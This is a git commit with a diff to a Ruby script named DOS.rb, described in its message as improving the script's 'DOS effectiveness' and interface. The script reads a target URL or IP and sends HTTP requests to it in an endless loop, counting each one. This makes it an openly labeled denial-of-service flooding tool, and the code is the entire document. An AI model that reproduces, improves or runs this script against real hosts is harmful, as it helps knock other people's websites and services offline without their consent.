114a76bc3c17243d98e6295aaab0c87a5aad8e2e
PerhapsSomeone <ma2003br@gmail.com>
2017-11-05 14:44:47 +0100

    Significantly improved DOS effectivness and UI. TODO: Add CTRL+C handler

--- DOS.rb
+++ DOS.rb
@@ -1,9 +1,25 @@
-system 'cls' or 'clear'
+system "cls" or system "clear"
 require 'net/http'
+require 'colorize'
 print "URL/IP: "
 host = gets.chomp
-puts "Use CTRL + C to exit"
+puts "Empty input!".light_red if host.empty?
+exit if host.empty?
+system "cls" or system "clear"
+puts "Locked on to: #{host}".light_red
+puts "Use CTRL + C to exit".green
+counter = 0
 while true
 Net::HTTP.get(host, '/index.html')
-puts "Request sent"
+counter += 1
+$stdout.write "\r#{counter} Requests sent".green;
+$stdout.flush;
+=begin
+trap "SIGINT" do
+   puts "Stopping..."
+   puts "Press ENTER to continue..."
+   gets
+   load 'PTools.rb'
+end
+=end
 end
